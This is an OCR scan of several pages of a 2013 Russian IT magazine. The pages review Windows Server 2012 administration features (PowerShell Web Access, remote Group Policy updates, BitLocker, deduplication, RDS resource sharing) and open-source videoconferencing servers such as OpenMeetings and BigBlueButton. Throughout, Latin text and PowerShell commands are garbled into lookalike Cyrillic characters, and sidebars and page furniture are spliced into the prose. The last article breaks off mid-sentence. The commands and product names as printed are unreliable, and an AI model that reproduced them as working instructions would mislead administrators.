ТооІ І5Ѵ5асітіп5.гиЛоріс247352.Гі1тІ) — используется для горячего 
бэкапа и восстановления ѴМ на базе Нурег-Ѵ. Поддерживает любую 
гостевую ОС, протестирован на ѴѴіп2к8/В2. Проблем с ним нет, если 
помнить об указанных ограничениях: поддержка только ѴНй и от- 
сутствие сжатия. 

В сторонних решениях, вероятно, потребуется установка агента 
в хостовую или гостевую ОС. Например, такая схема реализована 
в Асгопіз Васкир & Весоѵегу 11.5 Ѵігіиаі Есііііоп І асгопіз.ги/Ьаскир- 
гесоѵегу ). предлагающем возможность бэкапа, восстановления 
виртуальных систем Нурег-Ѵ, ВНЕѴ, Сіігіх ХепБегѵег, РагаІІеІз 
Бегѵег Ваге Меіаі, а также миграции на любую из указанных 
платформ. Для разных гипервизоров реализована своя схема 
создания резервных копий: агент устанавливается в хостовую или 
гостевые системы. Поддерживается дедупликация, сжатие образа, 
настройка исключений, сохранение на удаленный ресурс (диско- 
вые и сменные устройства, 5МВ/РТР/МР5, ленточные устройства) 
и прочие привычные для продуктов Асгопіб функции. 

Также следует обратить внимание на продукцию компании 
Ѵееат БоКѵѵаге ( ѵееат.сот/ги ). Среди прочих решений она пред- 
лагает простой в использовании и бесплатный Ѵееат2ІР (Ѵееат 
Васкир Ргее ЕЛііоп для ѴМѵѵаге и Нурег-Ѵ), который позволяет 
на лету создавать резервные копии ѴМ или отдельных каталогов 
и файлов, поддерживает сжатие и дедупликацию данных. С его 
помощью можно восстановить не только всю ѴМ, но и отдельные 
файлы. Реализовано управление при помощи графической консоли 
и командлетов РоѵѵегБЬеІІ. Кстати, Ѵееат2ІР победил в номинации 
«Лучший бесплатный продукт» на международной конференции 
ѴМѵѵогІсі 2012.31 



ХАКЕР 01 /168/2013 



121 






Мартин «игЬап.ргапк$1ег» Пранкевич (тагііпйзупаск.ги) 



ПОПУРРИ 

ОБЗОР ПОЛЕЗНЫХ, 

НО МАЛОИЗВЕСТНЫХ 
ФУНКЦИЙ ЖІ№0Ж5 
5ЕКѴЕК 2012 



ВЮІП2012 
уже не нужно 
импортировать 0Р0- 
модуль командой 
ІтроП-МойиІе 
СгоирРоІісу. 

По подсчетам 
МісговоМ, экономия 
от дедупликации 
может составлять 
до 30% для 




В \Мп2012 представлено много новых полезных 
возможностей, однако зачастую профильные 
книги и обзоры рассказывают только 
о самых основных — тех, которые находятся 
непосредственно на поверхности. Между тем 
некоторые фичи, позволяющие на порядок 
упростить настройку и сделать работу админа 
продуктивнее, проходят незамеченными. 



РАБОТА С КОНСОЛЬЮ Р0ѴѴЕР5НЕИ ИЗ БРАУЗЕРА 



Оболочка РоѵѵегБЬеІІ снискала огромную популярность среди системных 
администраторов благодаря тому, что с ее помощью можно автома- 
тизировать большинство задач и выполнять команды удаленно сразу 
на нескольких системах. Но для работы требуется РБ-консоль, а в век 
планшетников и смартфонов это серьезный недостаток. В \А/іп2012 
появился новый компонент РоѵѵегБНеІІ ѴѴеЬ Ассезз, предоставляю- 
щий возможность управлять своими системами практически с любого 
устройства, вводя команды прямо в веб-браузере. Компонент представ- 
ляет собой шлюз, реализованный в виде веб-приложения 115. Требова- 
ния к клиентской стороне весьма просты: браузер должен поддерживать 
^ѵаБсгірІ и принимать плюшки. В списке официально поддерживаемых 
бродилок ІЕ версии 8.0 и выше, Ріге(ох, боодіе СЬготе, Арріе Ба^агі, 



а также браузеры, установленные в ѴѴіпйоѵѵб РЬопе, АпсігоіЬ и іРЬопе/ 
іРасІ. Весь обмен данными происходит по НТТР5, поэтому бояться утечки 
данных не стоит. Чтобы развернуть серверную часть, достаточно в ма- 
стере добавления ролей отметить компонент «ѴѴіпсіоѵѵз РоѵѵегБЬеІІ 
ѴѴеЬ Ассезз» (находится в блоке РоѵѵегБЬеІІ) и подтвердить установ- 
ку сопутствующих компонентов и ролей (МЕТ Ргатеѵѵогк 4.5 и ѴѴеЬ 
Бегѵег (115), консоль управления 115 Мападег), необходимых для его 
работы. Если ранее не была развернута роль 115, то далее можно 
будет выбрать дополнительные службы ролей. 

Установку можно произвести и при помощи РоѵѵегБЬеІІ: 

Р5> ІП5Іа11-1лІіпс1ом5РеаТиге -Мате РомегБЬеІІИеЬАссезБ *-• 
-СотриТегМате <сотриТег_пате> -Іпс1исІеМапа§етеп1:Тоо1$ ^ 
-КезТагІ: 

Следующий шаг — настройка шлюза. Наиболее просто это сделать 
при помощи командлета ІпзІаІІ-РзѵѵаѴѴеЬАррІісаІіоп с именем пула 
в качестве параметра: 

Р5> ІПБТаІІ-РзѵѵаЫеЬАррІісаТіоп -ІлІеЬАррІісаТіопМате 
"ІлІеЬАссеББ" 

Если воспользоваться диспетчером служб 115, создать шлюз также 
несложно. Открываем сервер и переходим к меню «Пулы приложе- 
ний» (Арріісаііоп Рооів), добавляем новый пул, указав его имя и убе- 
дившись, что в поле «Версии среды Ргатеѵѵогк...» выбран Ргатеѵѵогк 
4.0.x. Теперь в меню «Сайты» (Бііев) щелчком по записи Ое^аиІІ ѴѴеЬ 
5іІе вызываем контекстное меню и выбираем пункт «Добавить при- 



122 



ХАКЕР 01/168/2013 




Попурри 




Окно ЖІГНІ0ѴѴ5 РоѵѵегЗЬеІІ ѴѴеЬ Ассезз 



ложение» (АсІсІ АррІ ісаііоп). В появившемся мастере указываем имя 
сайта (например, ѴѴеЬАссезз) и физический путь (файлы находятся 
в С:\ѴѴіпсіо\л/5\ѴѴеЬ\Роѵѵег5ЬеІІѴѴеЬАссе55\\ллллл/гоо^І. В поле «Пул при- 
ложений» выбираем созданный выше пул. Подтверждаем установки. 

Чтобы сайт заработал, нам понадобится сертификат, подписан- 
ный доверенным удостоверяющим центром, хотя в тестовых средах 
можно обойтись и самоподписанным. Чтобы его сгенерировать, 
достаточно добавить ключ '-ІІзеТезіСегМісаІе' к команде ІпзІаІІ- 
РзѵѵаѴѴеЬАррІісаІіоп. В диспетчере 115 переходим к серверу и в цен- 
тральном окне выбираем «Сертификаты сервера», теперь в окне 
«Действия» можем создать запрос сертификата или сгенериро- 
вать самоподписанный сертификат (Сгеаіе СеК Бідпегі СегМісаІе). 

В последнем случае нам понадобится ввести его имя и в качестве 
хранилища выбрать «Размещение веб-служб». Чтобы сайт мог ра- 
ботать с НТТР5, нужно создать привязку. Выбираем Ое(аиИ ѴѴеЬ 5іІе 
и в поле «Действие» — «Привязки». В появившемся окне указыва- 
ем протокол НТТР5 и выбираем сгенерированный сертификат. В на- 
стройках сайта переходим в «Параметры 55І_», где ставим флажок 
в пункте «Требовать 551». Теперь можно подключаться к серверу, 
указав в браузере имя узла и сайта (например, ЬКрз://ехатрІе.огд/ 
ѴѴеЬАссезз), для входа вводим свои учетные данные и имя шлюза. 

Следует отметить, что доступ к веб-консоли РоѵѵегБЬеІІ ѴѴеЬ Ассезз 
администратор предоставляет в явном виде, поэтому пока пользова- 
телю не назначены соответствующие права, подключиться к сеансу 
ему не удастся. Причем администратор может ограничивать сеанс 
отдельными компьютерами и даже разрешенными командлетами. 

Все установки хранятся в файле АіЛЬогігаІіопВиІез.хтІ, который 
должен читать веб-сервер. Чтобы упростить настройки 115, МісгозоК 
предоставляет готовые шаблоны, позволяющие дать нужные права 
веб-серверу. Вводим следующие команды: 



Например, разрешим пользователю ІІзег доступ к компьютеру 5ВѴ01: 

Р5> АсІсІ -РзмаАиІЬогіга'ЬіопРиІе -ІІзегМаше Ехатр1е\1)зег *-< 
-Сотри-СегМате 5РѴ01 -СопЯ§ига*іоп№те Асітіпз 

После введения команды получим таблицу с правами. Просмо- 
треть список всех настроек можно при помощи командлета беі- 
РзѵѵаАиіЬогігаЬопРиІе. В тестовой среде можно разрешить все и всем. 

Р5> АсИ -РзмаАи-ЬНогіга'ЬіопКиІе * * * 



УДАЛЕННОЕ ОБНОВЛЕНИЕ 6Р0 



После изменений 6Р0 необходимо некоторое время (90 минут 30), 
пока новые политики распространятся на другие системы. Но если их 
нужно применить немедленно, админу приходится регистрироваться 
на удаленной системе и выполнять команду дрирсіаіе. При большом 
количестве ПК процесс довольно утомителен и занимает некоторое 
время. Теперь об этом неудобстве можно забыть. В консоли управления 
групповой политикой (6РМС), в контекстном меню домена и подразде- 
ления, появился новый пункт «Обновление групповой политики» (бгоир 
Роіісу ІІрЬаІе], позволяющий произвести обновление политик систем, 
начиная с ѴѴіпсІоѵѵз ѴізІа/2008, двумя щелчками мышки. После актива- 
ции задания будет получен список компьютеров и зарегистрированных 
пользователей, после чего создается задание «дрирЬаІе.ехе Логсе». 

Во избежание перегрузки сети оно будет выполняться со случайной 
задержкой в интервале 0-10 минут. Результат выполнения задания ото- 
бражается в отдельном окне, успешность обновления можно определить 
с помощью мастера результирующей политики. 

Новая функция получила и свой командлет — Іпѵоке-бРІІрсІаІе, 
который позволяет удаленно обновить 6Р и предоставляет даже 
больше возможностей, чем 6РМС. Не лишним будет отметить, 
что за групповые политики отвечают 27 командлетов, получить пол- 
ный список можно, введя команду беІ-Соттапсі -Мосіиіе бгоирРоІісу. 

Чтобы немедленно обновить политики на конкретной системе, 
достаточно выполнить: 

Р5> Іпѵоке-СРУрсІаІе -Сотриіег <имя компьютера» 

Дополнительный ключ , -Рапс^от^еIауIпМіпи1е5 , задает интервал 
ожидания (нужно, если команда выполняется на нескольких системах). 

Но главное — в консоли 6РМС можно выбрать только подраз- 
деление, отдельного контейнера «Компьютеры» там нет. Вот здесь 
и выручает Іпѵоке-бРІІргіаІе, который совместно с командлетом беі- 
АОСотриІег позволяет отобрать системы по любому критерию: 

Р5> беІ-АОСотриІег -ЯИег * -БеагсЬЬазе ♦-> 

"сп=сотри1:ег5, ск=ехатр1е,сІс=ог8" | «-• 

^огеасЬ{ Іпѵоке-бРІірсІаТе -сотриТ:ег $_.пате 
-■Рогсе --КапсІотОеІауІпМіпи-Ьез 5} 



Р5> $арр1ісаТіопРооІ№те = "РомегБІіеІІ ІлІеЬ Ассезз” 

Р5> $аи-Ыіогі2а*іопРі1е = "С: \міпсІом5\меЬ\— 
ромегзНеІІіѵеЬассеззХгіаІаХАиІЬогігаТіопРиІез . хті" 

Р5> с:\міпс!ом5\5у5І:ет32\ісасІ5.ехе $аи'ЫюгІ2аТіопРі1е ^ 
/§гап1: ("" + "115 АррРооАІаррІісаІііопРооІ^те” + ^ 
•":«') > $пи11 

Просмотреть права на файл авторизации можно при помощи ісасіз: 
Р5> с:\міпсІом5\5у5І:ет32\ісасІ5.ехе $аи1:ІіогІ2аТ:іопРі1е 

Для управления доступом к веб-консоли предложен целый ряд 
командлетов — АбсіІВеппоѵеІбеІІТезІ-РзѵѵаАиіЬогігаІіопВиІе, которые 
имеют огромное количество параметров. Получить примеры исполь- 
зования можно командой: 

Се1:-Не1р <сшсІ1е1: паше> -Ехатріез 



Еще один важный момент настройки обновлений 6Р0: на кли- 
ентских системах необходимо открыть несколько портов брандма- 
уэра. Чтобы упростить жизнь админу, в М5 предложили две новые 
начальные политики (к восьми имеющимся), позволяющие быстро 
распространять нужные установки: 




Для управления дедупликацией предложено пятнадцать командлетов 



ХАКЕР 01 /168/2013 



123 








5ѴИ/АСК 




Интерфейс 6РМС позволяет удаленно обновить 6Р0 



• порты брандмауэра для удаленного обновления групповой политики; 

• порты брандмауэра для отчетов групповой политики. 

Назначение каждой понятно из названия. Нас интересует первая. 
Рекомендуется создать новый объект групповой политики и переме- 
стить его в начало, присвоив таким образом больший приоритет, чем 
у объекта групповой политики домена по умолчанию. 

Процесс прост. Выбираем домен и в меню щелкаем пункт «Соз- 
дать объект групповой политики в этом домене». В появившемся 
окне вводим название и выбираем из списка «Порты брандмауэра 
для удаленного обновления групповой политики». Как вариант, мож- 
но воспользоваться РоѵѵегЗЬеІІ: 

Р5> №м-СРО -Мате "СопЯ§иге бгемаіі гиіез «- 
■Рог гетоіе брирсіаііе" -51:аг1:егероМате «-» 

"Сгоир Роіісу Рето*е Цргіа-Се Рігеиаіі РогСз" | «-> 
Мем-СРИпк --Саг§е-1: "сIс=еxатр1е,сIс=ог§ ,, — 

-ИпкЕпаЫес! уез 



ИНТЕРЕСНЫЕ УСОВЕРШЕНСТВОВАНИЯ В ВІТЮСКЕР 



Функция ВіЩоскег позволяет шифровать с помощью алгоритма АЕ5 
системные тома, тома с данными и сменные носители. При больших 
объемах информации процесс может занимать достаточно длитель- 
ное время. В ѴѴіп8/201 2 администратор волен выбирать: шифровать 
весь диск или только занятое пространство. Во втором случае пустые 
блоки шифроваться не будут, что обеспечит значительное ускорение 
работы. Ранее для зашифровки необходимо было вначале установить 
ОС, а затем уже запускать процесс. Теперь ВіИоскег доступен из сре- 
ды ѴѴіпРЕ, позволяя зашифровать диск перед установкой ОС. 

Возможность выбора типа шифрования регулируется при помощи 
трех новых групповых политик «Применить тип шифрования диска...» 
отдельно для несъемных, съемных носителей и дисков с операци- 
онной системой. Они находятся в ветке «Конфигурация компьютера\ 
Политики\Административные шаблоны\Компоненты ѴѴіпсіоѵѵ5\Шиф- 
рование диска ВіИоскег» (Сотриіег СопЛдига*іоп\АгітіпІ 5 ІгаІіѵе 
ТетрІаІез\ѴѴіп(1оѵѵ5 СотропепІ5\ВіИоскег Огіѵе Епсгурііоп). Активи- 
ровав политику, администратор может принудительно установить тип 
шифрования ВіИоскег или разрешить выбирать его пользователю 
(применяется по умолчанию]. Кроме того, новые системы поддер- 
живают механизм РиІІ Ѵоіите Епсгурііоп системного тома и данных 
с использованием специального контроллера жесткого диска или 
АРІ, позволяющего использовать приложения третьих фирм. 

Для управления ВіИоскег требуются права администратора, но в не- 
которых организациях за ПК отвечают сами сотрудники, не имеющие та- 
ких прав. В ѴѴіпѲ/201 2 пользователям может быть разрешено изменение 
ПИН-кода тома или пароля, при условии, что они знают старый ПИН- 
код. Это позволяет, например, задать пользователям более понятные 
данные, которые легче запомнить, но которые соответствуют принятым 
политикам безопасности. Для управления этой возможностью следует 
использовать политику «Этот параметр позволяет запретить обычным 
пользователям изменять ПИН-код или пароль». 



Еще одна функция — Меіѵѵогк ІЭпІоск — дает возможность переза- 
грузить или разбудить Маке оп І_АМ) ОС без необходимости введения 
ПИН (работает только в доменной среде). Это может понадобить- 
ся, например, при установке патчей. Меіѵѵогк ІІпІоск реализована 
при помощи специального сетевого ключа, хранящегося на систем- 
ном диске вместе с сессионным АЕ5256 и открытым сертификатом 
ѴѴ05-сервера Міпсіоѵѵб йеріоутепі Зегѵісез, В5А2048), работающего 
под управлением \Л/іп201 2. 



ДЕДУПЛИКАЦИЯ ДАННЫХ 



На файловом сервере данные часто дублируются, что приво- 
дит к излишнему расходованию свободного места. Это могут быть 
виртуальные диски ѴМ, которые содержат множество однотипных 
данных (файлы ОС), или пользовательские файлы. В зависимости 
от ситуации справляются с этим при помощи одного из двух спосо- 
бов: поиска сходных файлов с последующим созданием ярлыков или 
дедупликации. Оба метода, в общем, схожи, только дедупликация 
работает на уровне блоков, а не файлов, и на порядок эффективнее, 
однако специализированный софт стоит немалых денег. В файловом 
сервере ѴѴіп201 2 появилась новая функция «Дедупликация данных» 
Юаіа йесіиріісаііоп), позволяющая экономить дисковое пространство 
и работающая со стандартными компонентами сервера. По подсчетам 
МісгозоК, экономия от дедупликации может составлять до 30% для до- 



НАСТРОЙКА ДЕДУПЛИКАЦИИ 
ПРИ ПОМОЩИ Р0ѴѴЕР5НЕИ 



При помощи РоѵѵегБЬеІІ довольно просто активировать функцию 
дедупликации. Устанавливаем соответствующий компонент: 

Р5> Ітрог*-Мос1и1е 5егѵегМапа§ег 

Р5> АсІсІ-МіпсІомБРеаІиге -пате Р5-0а1:а-0есІир1іса , Сіоп 

Компонент поставляется со своим модулем, который предостав- 
ляет пятнадцать командлетов. Просмотреть их список можно 
следующим образом: 

Р5> Ітрогі-Мосіиіе йесіиріісаііоп 
Р5> Сеі-Соттапсі -Мосіиіе йесіиріісаііоп 

Чтобы включить дедупликацию для диска, выполним команду: 

Р5> ЕпаЬІе-ОесІирѴоІите й: 

Чтобы не ждать, когда проснется планировщик, можно сразу и за- 
пустить задание: 

Р5> Б^агС-ОесІирІоЬ Э: -Туре Ор'Сітіга'Сіоп 

Чтобы просмотреть статистику и текущие задания, запускаем со- 
ответственно СеІ-ОесіирБіаІиз и 6еІ-0ес1ирЭоЬ. Результат смотрим 
при помощи 6еІ-0есіирМеІасіаІа, указав в качестве параметра 
нужный том: 

Р5> Се-С-ОесІирМеТ:асІа1:а -Ѵоіите О: 

Для настройки параметров дедупликации используем командлет 
5еІ-ОесіирѴоІите. Например, изменим количество дней, после 
которого файлы будут дедуплицироваться: 

Р5> 5е*-ОесІирѴо1ите Э: -МіпітитРі1еА§е0ау5 15 



124 



ХАКЕР 01/168/2013 







Попурри 




кументов и до 90% для ѴЬЮ. Но главное, это бесплатно, теперь нет 
необходимости применять сторонние решения. Функция реализована 
в виде двух компонентов: драйвера-фильтра, контролирующего І/О, 
и службы, занимающейся оптимизацией, сборкой мусора и очисткой. 

Ее можно применить на любом диске (кроме загрузочных и систем- 
ных разделов). Поддерживаются все версии МТР5, но дедупликация 
не работает с файлами <32 Кб, с Епсгуріесі Рііе Бузіет и файлами, 
имеющими расширенные атрибуты (Ехіепсіесі АИгіЬиІез). Если файл 
имеет альтернативный поток данных, только первичный поток данных 
будет в дедупликации и альтернативный поток останется на диске. 

При переносе раздела на другой сервер вся информация сохраняется. 

Чтобы не было лишней нагрузки, часто модифицируемые данные 
подвергаются дедупликации только при достижении определенно- 
го размера. Аналогично поступают и с новыми файлами, которые 
по умолчанию обрабатываются только через пять дней (период легко 
изменить при активации режима). По умолчанию не обрабатываются: 
архивы, видео, графические файлы и офисные документы. При необ- 
ходимости можно установить свои ограничения. 

Для установки компонента следует лишь отметить флажком 
пункт «Дедупликация данных», который находится в подразделе 
«Файловые службы и службы хранилища». Далее следует настроить 
функцию для выбранного раздела. В диспетчере сервера переходим 
в «Файловые службы и службы хранилища Тома» и в контекстном 
меню отмечаем пункт «Настройка дедупликации данных», затем в по- 
явившемся окне включаем функцию. Здесь же можно настроить два 




Быстрый доступ к средствам администрирования 




Установки политик для Кй5 в диспетчере системных ресурсов 



планировщика и указать каталоги, которые не нужно дедуплициро- 
вать. Через некоторое время появится/изменится значение в столбце 
«Степень дедупликации» Юесіиріісаііоп Ваіе). 

Для предварительного анализа возможной экономии от включе- 
ния дедупликации предложена утилита ООРЕѴАІ_.ехе: 

> с:\міпсІоѵу/5\5у5Т:ет32\сІс1реѵа1.ехе е:\ 



РАЗДЕЛЕНИЕ РЕСУРСОВ РЕМОТЕ РЕБКТОР 5ЕРѴІСЕ5 



Сервер, выполняющий одну роль, как правило, не требует механизма 
управления ресурсами. Но сегодня на сервере часто выполняется 
несколько приложений, а потому администратору нужно обеспечить 
гарантированное распределение ресурсов СРІІ и РАМ, иначе одно 
из приложений может захватить максимум ресурсов, блокировав 
выполнение остальных. Для этих целей можно использовать старый 
знакомый \Л/іп(іоѵѵ5 Бувіет Ревоигсе Мападег (МБРМ.твс), по- 
зволяющий гарантированно выделять ресурсы нескольким ролям 
или пользователям. При этом ѴѴ5РМ начинает применять политики, 
только если нагрузка превышает 70% (ранее просто нет смысла). 

По умолчанию содержит пять стандартных политик, которые легко 
привести в действие, предусмотрено создание пользовательских 
настроек. В общем, все бы хорошо, да только теперь ѴѴ5РМ объявлен 
устаревшим и будет исключен из следующих выпусков ОС. Почему так 
и чем будут заменять, пока не ясно. 

Наиболее востребована к распределению ресурсов служба Петоіе 
йезкіор Бегѵісез, вероятно поэтому в ѴѴіп2к8В2 появилась новая проак- 
тивная функция Оупатіс Раіг БЬаге БсЬесіиІіпд ЮР55), которая является 
новым компонентом Ветоіе йевкіор Беззіоп Нозі (Р05Н). Ее задача — 
автоматически распределять ресурсы СРІІ между пользователями. 
Внешне она похожа на политику ЕциаІ_Рег_5е55Іоп из ѴѴ5ВМ, но в отли- 
чие от последней реагирует на несколько порядков быстрее (несколько 
миллисекунд против секунд), так как встроена в ядро. В реализации 
йРББ в ѴѴіп201 2, кроме распределения СРІІ, добавлена функция рас- 
пределения полосы пропускания между сессиями (Меіѵѵогк Раіг БЬаге) 
и дисковых операций Юізк Раіг БЬаге). 

Функция активируется установкой параметра ЕпаЫеСриОіюІа 
(НКІМ_5ѴБТЕМ\СиггепіСопІгоІ5еІ\СопІгоІ\5е55Іоп Мападег\0ио1а 
Бузіепп) в значение 1. Для дисковых ресурсов служит параметр 
ЕпаЫеРаігБЬаге (НКІМ_БѴ5ТЕМ\СиггепіСопІгоІ5еі\СопІгоІ\Бегѵісе5\ 
ТБРаігБЬаге\0І5к). 

По умолчанию распределение ресурсов равномерное и ничем 
не регулируется. Если нужно предоставить отдельным группам поль- 
зователей большую часть ресурсов (например, админам, чтобы легче 
было зайти на сервер в критический момент), следует обратиться 
к встроенной в М5РМ политике ѴѴеідМесі_ВетоІе_5е55Іоп5, позволя- 
ющей задавать три приоритета: премиум, обычный и основной. ^ 



ХАКЕР 01 /168/2013 



125 






ВЫБИРАЕМ РЕШЕНИЕ 
ДЛЯ ОРГАНИЗАЦИИ 
КОРПОРАТИВНЫХ 
ВИДЕОКОНФЕРЕНЦИЙ 

При управлении компанией любого размера без 
совещаний не обойтись. Но одно дело, когда 
сотрудники находятся в одном здании, другое — 
когда их приходится собирать из разных 
городов и даже стран. Именно поэтому 
сегодня все более популярными становятся 
видеоконференции, позволяющие повысить 
эффективность общения и сэкономить на 
командировках. 



АРАСНЕ0РЕММЕЕТШ65 



В настоящее время для организации видеоконференций суще- 
ствует большое количество решений, отличающихся по назна- 
чению (внутреннее, внешнее использование, вещание), типу 
(персональные, групповые, комнатные), виду (точка — точка 
и многоточечные), реализации (аппаратные и программные), ис- 
пользуемым протоколам, стоимости и так далее. Рыночная цена 
коммерческих и особенно аппаратных решений довольно высока, 
однако применение свободного ПО поможет снизить затраты. 

Система веб-конференций АрасЬе ОрепМееЬпдз позволяет 
организовать проведение аудио- и видеосовещаний в многото- 
чечном режиме, когда к серверу подключены десятки человек. За 
несколько лет проект сменил несколько команд и лицензий, в том 
числе был в Соодіе Сосіе (под лицензией Есіірзе РиЫіс Ысепзе). 
Последняя его дислокация — инкубатор АрасЬе ( іпсиЬаІог.арасЬе. 
ог д/орептееііпдз ). соответственно, поменялась и лицензия, на 
АрасЬе Ысепзе 2.0. Последняя официальная версия 2.0 вышла 
в конце июля 2012 года. 

Главный плюс — для видеосовещания не требуется установка 
дополнительного ПО, достаточно веб-браузера с плагином для 
поддержки технологии РІазЬ. Предусмотрена возможность записи 
и последующего проигрывания совещаний и экспорта в АѴІ/ПѴ- 
файл, импорт в конференцию документов более чем 20 форматов 
и изображений. Участники могут скачать загруженный файл и со- 



126 



ХАКЕР 01 /168/2013 









Лицом к лицу 



вместно редактировать, вводя текст поверх оригинала, рисовать 
и помечать интересные места. Сами конференции могут быть 
открытыми и частными. Поддерживается два режима: 

• совещание— до Ібучастников, каждый может передавать 

аудио- и видеоданные; 

• лекции— до 200участников, передача аудио и видеотолько 

у модератора/лектора. 

Предусмотрен также обмен текстовыми сообщениями в окне 
чата или приватными (используется встроенный ЭаЬЬег-сервис). 
Настройки позволяют создать опрос. Модератор, организующий 
конференцию, отправляет всем участникам приглашение, со- 
держащее прямую ссылку, он же управляет всеми доступными им 
возможностями. У каждого зарегистрированного пользователя 
имеется календарь событий с напоминанием о событиях (че- 
рез электронную почту или іСаІ). При подключении выбирается 
вариант участия (видео + аудио, только видео или аудио, рисунки), 
разрешение и устройство. Настройки в комнате просты и понятны 
каждому, пользователь, впервые работающий с сервисом, быстро 
освоится. 

Возможна интеграция ОрепМееІіпдз с другими продуктами — 
сервером ѴоІР Азіегізк, системой управления обучением Моосііе, 
ОгираІ, Эоотіа, БидагСВМ и некоторыми другими. 

Реализовано три уровня доступа — пользователь, модератор 
и администратор сервера. Для аутентификации возможно ис- 
пользование внутренней базы или сервиса ЮАР/ Асііѵе Оігесіогу 
(в $ВЕ05_Н0МЕ/\л/еЬаррз/орептееІіпдз/соп{ найдешь готовые 
шаблоны для подключения). Возможна работа нескольких серве- 
ров ОрепМееІіпдз в кластере, одна установка может обслуживать 
несколько организаций. 

Интерфейс ОрепМееІіпдз переведен на несколько языков, 
среди которых есть русский. Встроенный редактор локализован- 
ных сообщений ЦапдиадеЕсШог) позволяет при необходимости 
скорректировать перевод. Внешний вид можно изменить при 
помощи тем. 

Построен ОрепМееІіпдз с использованием технологий ^ѵа 
и ХМ1_. Для организации сервера задействуются: веб-сервер 
АрасЬе Тотсаі, Ореп Боигсе РІазЬ/ВТМР Бегѵег Несі5, ОрепОКісе. 
огд/иЬгеОНісе. В качестве базы данных может быть использо- 
вана Му5СІІ_, РозІдгеБОІ., Огасіе, ЭВ2 или АрасЬе ОегЬу. Предла- 
гается демосайт, на котором можно познакомиться с основными 
возможностями ОрепМееІіпдз. Соединение с сервером осущест- 
вляется по протоколам НТТР (порт 5080), РТМР (порт 1935), РТМРТ 
(порт 8088). Встроенный менеджер создания резервных копий 
упрощает резервирование и восстановление работоспособности 
сервера и перенос в другую систему. 



Компоненты мультиплатформенные, поэтому сервер бу- 
дет работать на любой *піх-системе или ѴѴіпсІоѵѵз. Установку 
ОрепМееІіпдз сложной назвать нельзя, процесс просто требует 
должной внимательности, в последующем эксплуатация особых 
хлопот не вызывает. 

Требования к оборудованию невысоки, минимальные, которые 
указаны на сайте, — компьютер с процессором 1 ГГц СРб и 1 Гб 
ОЗУ. Но для конвертирования документов, загрузки файлов и за- 
писи видео этой мощности не хватит. В качестве рекомендуемых 
указан компьютер 2х/4х 2 ГГц (32/64 бит) и 4 Гб ОЗУ. Для организа- 
ции 100 соединений достаточно компьютера класса Репііит 4 
с 2 Гб ОЗУ. 



ВІбВШЕВІЛТОЫ 



Первая версия ВідВІиеВіШоп ( ЫдЫцеЬииоп.огд ) была написана 
в 2007 году одним из сотрудников Карлтонского университета 
г. Оттава, Канада (Сагіеіоп Ііпіѵегзііу), при поддержке программы 
развития инновационных технологий и управления. Изначально 
продукт носил имя ВІіпсізісіе, но позже название было изменено 
на ВідВІиеВииоп, чтобы отразить простоту в использовании — 
для начала конференции нужно всего лишь нажать символиче- 
скую синюю кнопку. Именно в простоте преимущество ВВВ перед 
более функциональным и оснащенным, а значит, и чуть более 
сложным ОрепМееІіпдз. Проект некоторое время искал свое ме- 
сто и сегодня ориентирован на организации, предлагающие ус- 
луги дистанционного образования, позволяя проводить обучение 
через интернет. Особая роль в этом процессе отводится одной из 
функций — видеоконференции. Но ВВВ с таким же успехом может 
быть использован для простого общения, проведения брифингов 
и вебинаров. В 2009 году была организована компания ВІіпсізісіе 
Меіѵѵогкз для оказания платной поддержки пользователям 
продукта. Наиболее серьезным толчком к разработке продукта 
послужило участие в боодіе Биттег оі Сосіе в 2010 году. Именно 
тогда был добавлен АРІ, позволяющий подключать сторонние 
приложения, и сегодня встроить ВВВ можно в Бакаі, ѴѴогсіРгезз, 
Моосііе, .Іоотіа, Ресітіпе, ОгираІ, МаНегЬогп, І_АМ5 и некоторые 
другие. Эта возможность более всего востребована пользова- 
телями ВВВ, поэтому из настроек сервера был убран интерфейс 
администратора: разработчики просто не видят смысла его раз- 
вивать, так как управление ложится на плечи того, кто встраи- 
вает приложение. В случае отдельного сервера все установки 
можно без проблем произвести при помощи конфигурационных 
файлов ВідВІиеВіШоп и возможностей веб-сервера. Проект нахо- 
дится на стадии активной разработки, причем следует отметить 
особую щепетильность в этом вопросе. Например, выходу версии 
0.8 Ваііеиі предшествовали четыре беты и три ВС. Недавно про- 




Совместная работа с документом в ОрепМееІіпдз 




Выбор устройства при подключении к конференции в ОрепМееІіпдз 



ХАКЕР 01 /168/2013 



127 






ВИДЕОКОНФЕРЕНЦИИ СО ЗВЕЗДАМИ 




В популярном ѴоІР-сервере Азіегізк конференцию можно 
организовать при помощи стандартного приложения МееіМе 
(арр_тееІте.5о), которое поддерживает динамическое создание 
конференций, защиту паролем, разделение ролей, запись и многое 
другое. Процесс конфигурирования очень прост, достаточно 
отредактировать пару строчек в тееіте.соп*, а управление 
производится при помощи голосового меню. Что касается качества 
связи, то оно оставляет желать лучшего. К альтернативным 
решениям стоит отнести: СопШгігіде (переработанный МееІМе), 
арр_соп^егепсе и его форк арр_копІегепсе. Так, арр_соп^егепсе 
позволяет организовать аудио- и видеоконференцию с несколькими 
пользователями в приемлемом качестве. При этом он не микширует 
видеопотоки от участников (только аудио), а просто переправляет 
их нужным абонентам, что существенно снижаеттребования к 
оборудованию. 



Для работы ВідВІиеВіШоп рекомендуется сервер с СРІІ ОиаІ 
Соге 2,6 ГГц, 2 Гб ОЗУ и место на жестком диске с учетом записи 
трансляций. Количество пользователей, которые смогут одно- 
временно общаться на сервере, зависит от мощности оборудова- 
ния и пропускной способности канала. Отдельный поток требует 
30-50 Кб/с. Приблизительные расчеты можно найти в РАО ( доо.ді/ 
Рі і7У ). там же приводятся данные стресс-теста. Для подключения 
клиентов по умолчанию используется стандартный 80-й порт, 
который не должен быть занят другим приложением. В правилах 
брандмауэра должны быть открыты порты 80 (НИР), 935 (РТМР) 
и 9123 (общий рабочий стол). 

Доступен исходный код, позволяющий установить ВВВ на 
любой компьютер, работающий под управлением Ыпих, РгееВБО, 
Мае ОБ X или Мпсіоѵѵв. Для ІЛэипІи и СепЮБ есть готовые пакеты 
и репозитории. Сервер ВВВ может работать в облачной среде 
вроде Атагоп ЕС2. 

Документация на сайте проекта весьма подробна, в ней можно 
найти ответы практически на все возникающие вопросы — 
по установке (есть готовые конфиги), конфигурированию, АРІ, 
локализации, настройке отдельных компонентов (ѴоІР, пдіпх и по- 
добных) и прочим моментам. Свои вопросы можно задать в списке 
рассылки, предлагается несколько видеоруководств. Доступны 
образ ѴМ и демосервер, позволяющие познакомиться с основны- 
